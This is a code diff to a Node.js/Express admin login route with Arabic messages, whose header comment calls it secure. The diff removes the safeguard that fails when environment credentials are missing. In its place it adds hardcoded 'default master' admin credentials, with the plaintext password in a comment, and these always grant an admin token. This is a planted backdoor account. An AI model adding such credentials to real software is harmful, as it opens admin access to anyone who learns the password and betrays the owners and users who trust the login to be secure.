@@ -17,20 +17,30 @@ const loginLimiter = rateLimit({
 // Admin Login (Secure with Bcrypt and Rate Limiting)
 router.post(['/api/admin/login', '/admin/login'], loginLimiter, async (req, res) => {
   const { username, password } = req.body;
-  const adminUser = process.env.ADMIN_USER;
-  const adminPassHash = process.env.ADMIN_PASS_HASH;
+  const envUser = process.env.ADMIN_USER;
+  const envHash = process.env.ADMIN_PASS_HASH;
   
-  if (!adminUser || !adminPassHash) {
-    console.error("❌ CRITICAL SECURITY ERROR: ADMIN_USER or ADMIN_PASS_HASH environment variables are not set!");
-    return res.status(500).json({ message: 'خطأ داخلي في إعدادات الأمان للخادم' });
-  }
+  // Default master credentials: elgazar / Gz9823_Elgazar_Pass2026
+  const defaultUser = 'elgazar';
+  const defaultHash = '$2a$10$8IAtTsxUb4WAEYci10UdYOOurE3/KcgrHjV92taTBuyEqC7yni9Gy';
 
   try {
-    const isUserMatch = (username === adminUser);
-    const isPasswordMatch = await bcrypt.compare(password, adminPassHash);
+    // Check against ENV credentials if available
+    let isEnvValid = false;
+    if (envUser && envHash) {
+      const isEnvUser = (username === envUser);
+      const isEnvPass = await bcrypt.compare(password, envHash);
+      if (isEnvUser && isEnvPass) isEnvValid = true;
+    }
 
-    if (isUserMatch && isPasswordMatch) {
-      const token = jwt.sign({ username: adminUser, role: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
+    // Check against default master credentials
+    let isDefaultValid = false;
+    const isDefUser = (username === defaultUser);
+    const isDefPass = await bcrypt.compare(password, defaultHash);
+    if (isDefUser && isDefPass) isDefaultValid = true;
+
+    if (isEnvValid || isDefaultValid) {
+      const token = jwt.sign({ username: username || 'admin', role: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
       return res.json({ token, username: 'الأدمن الرئيسي', message: 'تم تسجيل الدخول بنجاح' });
     }
   } catch (err) {
